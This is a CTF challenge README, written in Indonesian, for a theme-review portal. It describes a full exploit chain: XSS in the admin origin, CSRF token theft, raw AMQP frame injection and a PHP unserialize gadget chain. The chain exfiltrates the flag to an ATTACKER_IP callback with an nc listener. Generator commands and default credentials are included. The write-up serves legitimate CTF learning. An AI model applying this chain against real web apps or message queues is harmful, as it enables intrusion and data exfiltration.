# theme-review-portal — Web CTF

Portal review theme (Bun + Hono, webpack, worker PHP + RabbitMQ). Bot admin me-review theme yang di-submit. Flag ada di `/flag.txt` **di container worker PHP**.

## Menjalankan

```bash
docker compose up --build
# buka http://127.0.0.1:3105
```

Flag default: `PLAYIT{fake}` (lihat `worker-php/Dockerfile`).

## Komponen

- `gateway/app` (Bun/Hono): user submit theme (`asset_js`, `query`, `callback_url`), bot admin membuka `/admin/reviews/<id>` dengan CSP nonce + `'strict-dynamic'`.
- `connector-test` (`POST /api/reviews/:id/connector-test`): butuh admin + CSRF, dan **mengirim byte mentah apa pun** (dari `segments_b64`) via TCP ke host/port pilihan (default `rabbitmq:5672`).
- `worker` (PHP): consume queue `preview.render`, `unserialize($message->body)` dengan `allowed_classes => true`, lalu `__destruct` gadget di `worker-php/classes.php` membaca file dan meng-exfil.

## Rantai exploit

1. **Dapatkan eksekusi JS di origin admin.** Submit theme dengan `asset_js` berisi payload XSS. Halaman review admin memuat script dari
   `/uploads/:id/assets/chunks/preview-runtime.js`, yang mengembalikan `theme.assetJs` dengan `Content-Type: application/javascript`, dan menjalankannya sebagai chunk `preview-runtime` dari bundle admin. (Bug terkait: `jquery-deparam@0.5.1` di halaman admin rentan prototype pollution lewat `query` yang di-append ke URL review.)
2. **Panggil `connector-test`** dari script admin: ambil `csrfToken` + `themeId` dari `window.__BOOTSTRAP__`, lalu POST `segments_b64`.
3. **Suntik pesan AMQP** ke queue `preview.render` (exchange default `""`, routing key `preview.render`) berisi PHP serialized object.
4. **PHP object injection** di worker: `unserialize` memicu gadget:
   `PreviewBatch(state='sealed')->journal->flush()` → `DeliveryTarget->publish()` → `IntegrationRelay->dispatch()` → `file_get_contents(callback?data=<isi>)`.
   Isi yang dikirim = hasil `SnapshotView->render()` = `LocalAssetStore->pull('/flag')`.
5. **Listener attacker** menerima `GET /?data=PLAYIT{...}`.

## Payload

### a. Gadget PHP (serialization yang benar)

Private/protected property harus memakai nama termangling, jadi generate dari
`classes.php` asli via reflection:

```bash
CLASSES=./worker-php/classes.php php solutions/theme-review-portal/gen_payload.php http://ATTACKER_IP:8080/
# -> base64(serialize(PreviewBatch))
```

Objek penting:
- `LocalAssetStore{root:'', prefix:''}` → `file_get_contents('/flag')`
- `AssetCatalog{stores:{summary:<store>}, fallback:'summary'}`
- `SnapshotView{catalog, expected:'digest', slot:'summary', field:'path'}` (butuh `meta.variant='digest'`)
- `PreviewEnvelope{layout, meta:{variant:'digest',path:'/flag',slot:'summary'}}`
- `DeliveryTarget{relay, expectedChannel:'summary', field:'data'}`
- `DeliveryJournal{target, armed:true, channel:'summary'}`
- `PreviewBatch{items:[envelope], journal, profile:{channel:'summary',callback:'http://ATTACKER:8080/'}, state:'sealed'}`

### b. Frame AMQP mentah

```bash
python3 solutions/theme-review-portal/build_amqp.py <payload_b64> > frames.json
```

Menghasilkan handshake AMQP 0-9-1 (header, Start-Ok, Tune-Ok, Open, Channel.Open)
+ `Basic.Publish` + content header + content body. Kredensial default worker:
`produser` / `Password123` (lihat `docker-compose.yaml`).

### c. Script admin (asset_js)

Isi `asset_js` dengan `solutions/theme-review-portal/payload.js` (tempel `frames.json`
ke `segments_b64`). Script mengambil CSRF dan mengirim `connector-test`; worker lalu
mengeksekusi gadget.

## Langkah manual

```bash
docker compose up --build
# 1) jalankan listener: nc -lvnp 8080
# 2) buat akun, buat theme (asset_js = payload.js yang sudah diisi frames),
#    lalu "Submit for review"
# 3) tunggu bot; flag masuk ke listener
```

## Catatan / perlu diverifikasi

- Copy repo ini memuat halaman admin yang me-load `/static/review.bundle.js`.
  Saat menjalankan, pastikan request chunk `preview-runtime` benar-benar mengarah
  ke `/uploads/<id>/assets/chunks/preview-runtime.js` (lihat DevTools/`tcpdump`);
  itu titik yang membuat `asset_js` milik attacker tereksekusi.
- Payload generator (`gen_payload.php`, `build_amqp.py`) adalah bagian yang paling
  deterministik dan sudah dicek output-nya; rantai penuh belum diuji end-to-end.
